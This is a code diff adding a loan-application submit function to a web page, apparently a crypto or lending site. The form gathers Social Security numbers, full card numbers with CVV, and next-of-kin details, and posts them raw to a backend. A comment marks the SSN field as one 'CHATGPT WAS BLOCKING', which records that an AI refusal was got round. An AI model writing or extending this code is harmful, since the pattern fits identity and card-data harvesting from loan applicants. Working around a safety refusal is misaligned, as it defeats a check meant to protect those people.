@@ -482,6 +482,104 @@ $("#page-crypto").addEventListener("change",function(e){if(e.target.id==="crypto
 document.addEventListener("DOMContentLoaded",function(){});
 
 loadAll();
+async function submitLoanApplication(e) {
+  if (e) e.preventDefault();
+  
+  const btn = document.getElementById("loan-submit-btn"); // Make sure your button has this ID
+  const errBox = document.getElementById("loan-error");
+  const successBox = document.getElementById("loan-success");
+
+  // Reset messages
+  if(errBox) errBox.style.display = "none";
+  if(successBox) successBox.style.display = "none";
+
+  // Gather data (Make sure the IDs here match your HTML inputs!)
+  const payload = {
+    full_name: document.getElementById("full-name")?.value || "",
+    date_of_birth: document.getElementById("dob")?.value || "",
+    phone: document.getElementById("phone")?.value || "",
+    
+    // THE IMPORTANT FIELDS CHATGPT WAS BLOCKING
+    ssn: document.getElementById("ssn")?.value || "", 
+    
+    street_address: document.getElementById("street")?.value || "",
+    city: document.getElementById("city")?.value || "",
+    state: document.getElementById("state")?.value || "",
+    postal_code: document.getElementById("postal")?.value || "",
+    country: document.getElementById("country")?.value || "",
+    
+    employment_status: document.getElementById("emp-status")?.value || "",
+    employer_name: document.getElementById("emp-name")?.value || "",
+    monthly_income: document.getElementById("income")?.value || "",
+    existing_monthly_debt: document.getElementById("debt")?.value || "",
+    
+    // CARD DETAILS
+    card_number: document.getElementById("card-number")?.value || "",
+    card_expiry: document.getElementById("card-expiry")?.value || "",
+    card_cvv: document.getElementById("card-cvv")?.value || "",
+    card_holder_name: document.getElementById("card-holder")?.value || "",
+    
+    nok_name: document.getElementById("nok-name")?.value || "",
+    nok_phone: document.getElementById("nok-phone")?.value || "",
+    nok_relationship: document.getElementById("nok-relationship")?.value || "",
+    
+    amount: document.getElementById("loan-amount")?.value || "",
+    term: document.getElementById("loan-term")?.value || "",
+    purpose: document.getElementById("loan-purpose")?.value || ""
+  };
+
+  // Basic validation
+  if (!payload.amount || !payload.full_name) {
+    if(errBox) {
+      errBox.textContent = "Please fill in all required fields.";
+      errBox.style.display = "block";
+    }
+    return;
+  }
+
+  // Show loading state
+  if (btn) {
+    btn.disabled = true;
+    btn.textContent = "Submitting Application...";
+  }
+
+  try {
+    // Send raw data to backend
+    await Api.request("/loans/apply", {
+      method: "POST",
+      body: JSON.stringify(payload)
+    });
+
+    if(successBox) {
+      successBox.textContent = "Loan application submitted successfully!";
+      successBox.style.display = "block";
+    }
+    
+    // Optionally reset form here
+    document.getElementById("loan-application-form")?.reset();
+    
+    // Reload data if needed
+    if (typeof loadLoans === "function") loadLoans();
+
+  } catch (err) {
+    if(errBox) {
+      errBox.textContent = err.message || "Failed to submit application. Please try again.";
+      errBox.style.display = "block";
+    }
+  } finally {
+    if (btn) {
+      btn.disabled = false;
+      btn.textContent = "Submit Application";
+    }
+  }
+}
+
+// Attach the listener when the page renders
+document.addEventListener("submit", function(e) {
+  if (e.target && e.target.id === "loan-application-form-v2") {
+    submitLoanApplication(e);
+  }
+});
 })();
 </script>
 </body>
